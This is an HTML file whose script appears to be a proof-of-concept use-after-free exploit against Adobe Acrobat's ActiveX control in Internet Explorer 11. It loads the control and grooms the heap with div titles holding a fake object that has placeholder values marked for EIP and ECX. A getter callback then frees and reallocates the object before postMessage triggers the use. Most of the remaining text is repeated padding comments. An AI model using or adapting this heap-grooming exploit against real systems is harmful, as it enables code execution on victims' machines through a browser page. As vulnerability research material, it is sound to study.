<html>
    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=11">
        <script>

            // Global vars
            var realloc = new Array();
            var lfh = new Array();
            var targetarr = ["foo", "bar"];

            // Load Adobe Acrobat ActiveX
            var targetobj = new ActiveXObject("AcroPDF.PDF");
            targetobj.src = "testcase.pdf";

            // Create fake object (0x58 bytes)
            var fakeobj = unescape("%u4242%u4242");     // POI(ECX)
            fakeobj += "AAAAAAAAAAAAAAAAAAAAAA";        // Junk 1
            fakeobj += unescape("%u4141%u4141");        // EIP
            fakeobj += "BBBBBB";                        // Junk 2
            fakeobj += unescape("%u4343%u4343");        // (ESP+8)
            fakeobj += "CCCCCCCCC";                     // Junk 3

            // Trigger LFH
            for (var i=0; i<0x20; i++) {
                var div = window.document.createElement("div");
                div.title = fakeobj;
                lfh.push(div);
            }

            // Prepare fake allocations
            for (var i=0; i<0x100; i++){
                realloc.push(window.document.createElement("div"));
            }

            // Callback to trigger free
            Object.defineProperty(targetarr, '0', {
                get: function() {
                    //  Trigger free
                    targetobj.LoadFile("test");
                    // Realloc free slot
                    for (var i=0; i<0x100; i++){
                        realloc[i].title = fakeobj;
                    }
                    return "foo";
                }
            });

            window.alert("Triggering the uaf.");

            // Start use-after-free
            targetobj.postMessage(targetarr);

            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
            // Padding to fill required filesize
        </script>
    </head>
</html>
